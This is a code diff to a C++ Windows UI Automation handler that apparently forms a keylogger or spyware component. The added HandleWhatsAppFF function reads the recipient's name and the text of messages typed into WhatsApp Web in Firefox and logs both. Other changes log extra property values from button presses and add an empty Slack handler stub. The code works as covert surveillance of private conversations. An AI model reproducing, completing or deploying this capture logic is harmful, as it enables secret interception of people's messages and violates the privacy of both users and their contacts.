@@ -56,10 +56,15 @@ void MyAutomationEventHandler::HandleFirefox(IUIAutomationElement* pAutomationEl
 		}
 
 		wsUrl = std::wstring(vUrlBar.bstrVal);
-		Log(L"URL: " + wsUrl, DBG);
+		//Log(L"URL: " + wsUrl, DBG);
 
 		wsDomain = Helpers::GetDomainFromUrl(vUrlBar.bstrVal);
 
+		break;
+
+	case UIA_Invoke_InvokedEventId:
+	case UIA_Window_WindowOpenedEventId:
+		HandleOther(pAutomationElement, wsProcName, wsEventString, wsDate, eventID);
 		break;
 
 	default:
@@ -67,6 +72,19 @@ void MyAutomationEventHandler::HandleFirefox(IUIAutomationElement* pAutomationEl
 		break;
 	}
 
+	std::unordered_map<std::wstring, std::function<void()>> handlers = {
+			{ L"web.whatsapp.com", [this, pAutomationElement, wsProcName, wsDate]() { HandleWhatsAppFF(pAutomationElement, wsProcName, wsDate); } },
+			{ L"app.slack.com", [this, pAutomationElement, wsProcName, wsDate]() { HandleSlackFF(pAutomationElement, wsProcName, wsDate); } }
+	};
+
+	auto it = handlers.find(Helpers::ConvertToLower(wsDomain));
+
+	if (it != handlers.end()) {
+		it->second();
+	}
+	else {
+		HandleOther(pAutomationElement, wsProcName, wsEventString, wsDate, eventID);
+	}
 
 	if (bUrlBar)
 		SysFreeString(bUrlBar);
@@ -74,12 +92,6 @@ void MyAutomationEventHandler::HandleFirefox(IUIAutomationElement* pAutomationEl
 	VariantClear(&vValue);
 	VariantClear(&vUrlBar);
 	VariantClear(&vAutomationId);
-}
-
-void MyAutomationEventHandler::HandleChrome(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsEventString, const std::wstring& wsDate, EVENTID eventID)
-{
-	Log(L"HandleChrome() Invoked", DBG);
-	Log(L"Todo :))", INFO);
 }
 
 void MyAutomationEventHandler::HandleExplorer(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsEventString, const std::wstring& wsDate, EVENTID eventID)
@@ -175,6 +187,13 @@ void MyAutomationEventHandler::HandleOther(IUIAutomationElement* pAutomationElem
 			break;
 		}
 
+		hr = pAutomationElement->GetCurrentPropertyValue(UIA_ValueValuePropertyId, &vValue);
+		if (FAILED(hr))
+		{
+			Log(L"Can't get property value", WARNING);
+			break;
+		}
+
 		hr = pAutomationElement->get_CurrentControlType(&ctId);
 		if (FAILED(hr))
 		{
@@ -196,6 +215,7 @@ void MyAutomationEventHandler::HandleOther(IUIAutomationElement* pAutomationElem
 		wsLogKeyStroke += L"\n\tLocalizedControlType: " + std::wstring(bLocalizedControlType);
 		wsLogKeyStroke += L"\n\tName: " + std::wstring(bWindowName);
 		wsLogKeyStroke += L"\n\tHelp: " + std::wstring(vHelp.bstrVal);
+		wsLogKeyStroke += L"\n\tProp Value: " + std::wstring(vValue.bstrVal);
 		wsLogKeyStroke += L"\n--------------[User pressed the button]--------------";
 
 		Log(wsLogKeyStroke, EMPTY);
@@ -240,4 +260,106 @@ void MyAutomationEventHandler::HandleOther(IUIAutomationElement* pAutomationElem
 
 	VariantClear(&vHelp);
 	VariantClear(&vValue);
+}
+
+void MyAutomationEventHandler::HandleWhatsAppFF(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsDate)
+{
+	BSTR bMsgReceiver = NULL;
+	HRESULT hr = ERROR_SUCCESS;
+	std::wstring wsLogKeyStroke = wsDate + L" " + wsProcName + L" [ New Web WhatsApp Message ]";
+
+	VARIANT vIAccessibleRoleValue;
+	VARIANT vAriaRoleValue;
+	VARIANT vMsgValue;
+	VariantInit(&vIAccessibleRoleValue);
+	VariantInit(&vAriaRoleValue);
+	VariantInit(&vMsgValue);
+
+	CComPtr<IUIAutomation> pAutomation = g_pMyTreeWalker->GetPAutomation();
+	CComPtr<IUIAutomationCondition> pControlTypeCondition = NULL;
+	CComPtr<IUIAutomationCondition> pDefaultActionCondition = NULL;
+	CComPtr<IUIAutomationCondition> pInvokePatternCondition = NULL;
+	CComPtr<IUIAutomationCondition> pScrollItemPatternCondition = NULL;
+	CComPtr<IUIAutomationCondition> pAndCondition1 = NULL;
+	CComPtr<IUIAutomationCondition> pAndCondition2 = NULL;
+	CComPtr<IUIAutomationCondition> pAndCondition3 = NULL;
+	
+	CComPtr<IUIAutomationElement> pAutomationElementProfileInfo = NULL;
+	CComPtr<IUIAutomationElement> pAutomationElementReceiver = NULL;
+
+	IUIAutomationTreeWalker* pWalker = NULL;
+
+	// check for the right field
+	hr = pAutomationElement->GetCurrentPropertyValue(UIA_LegacyIAccessibleRolePropertyId, &vIAccessibleRoleValue);
+	if (FAILED(hr) || vIAccessibleRoleValue.iVal != 42)
+	{
+		goto exit;
+	}
+
+	hr = pAutomationElement->GetCurrentPropertyValue(UIA_AriaRolePropertyId, &vAriaRoleValue);
+	if (FAILED(hr) || vAriaRoleValue.bstrVal == NULL || wcscmp(vAriaRoleValue.bstrVal, L"textbox") != 0)
+	{
+		goto exit;
+	}
+
+	// find msg receiver
+	pAutomation->CreatePropertyCondition(UIA_ControlTypePropertyId, CComVariant(UIA_ButtonControlTypeId), &pControlTypeCondition);
+	pAutomation->CreatePropertyCondition(UIA_LegacyIAccessibleDefaultActionPropertyId, CComVariant(L"click"), &pDefaultActionCondition);
+	pAutomation->CreatePropertyCondition(UIA_IsInvokePatternAvailablePropertyId, CComVariant(true), &pInvokePatternCondition);
+	pAutomation->CreatePropertyCondition(UIA_IsScrollItemPatternAvailablePropertyId, CComVariant(true), &pScrollItemPatternCondition);
+
+	pAutomation->CreateAndCondition(pControlTypeCondition, pDefaultActionCondition, &pAndCondition1);
+	pAutomation->CreateAndCondition(pAndCondition1, pInvokePatternCondition, &pAndCondition2);
+	pAutomation->CreateAndCondition(pAndCondition2, pScrollItemPatternCondition, &pAndCondition3);
+
+	pAutomationElementProfileInfo = g_pMyTreeWalker->FindFirstAscending(pAutomationElement, pAndCondition3);
+	if (pAutomationElementProfileInfo == NULL)
+	{
+		goto exit;
+	}
+
+	pWalker = g_pMyTreeWalker->GetPTreeWalker();
+	if (pWalker == NULL)
+	{
+		goto exit;
+	}
+
+	hr = pWalker->GetNextSiblingElement(pAutomationElementProfileInfo, &pAutomationElementReceiver);
+	if (FAILED(hr))
+	{
+		Log(L"Can't find msg receiver gui element", DBG);
+		goto exit;
+	}
+
+	hr = pAutomationElementReceiver->get_CurrentName(&bMsgReceiver);
+	if (FAILED(hr))
+	{
+		Log(L"Can't get msg receiver name", DBG);
+		goto exit;
+	}
+
+	wsLogKeyStroke += L"\nTo: " + std::wstring(bMsgReceiver);
+	
+	// msg contents
+	hr = pAutomationElement->GetCurrentPropertyValue(UIA_ValueValuePropertyId, &vMsgValue);
+	if (FAILED(hr))
+	{
+		goto exit;
+	}
+	wsLogKeyStroke += L"\nMsg: " + std::wstring(vMsgValue.bstrVal);
+
+	Log(wsLogKeyStroke, EMPTY);
+
+exit:
+	if (bMsgReceiver)
+		SysFreeString(bMsgReceiver);
+
+	VariantClear(&vMsgValue);
+	VariantClear(&vAriaRoleValue);
+	VariantClear(&vIAccessibleRoleValue);
+	return;
+}
+void MyAutomationEventHandler::HandleSlackFF(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsDate)
+{
+
 }
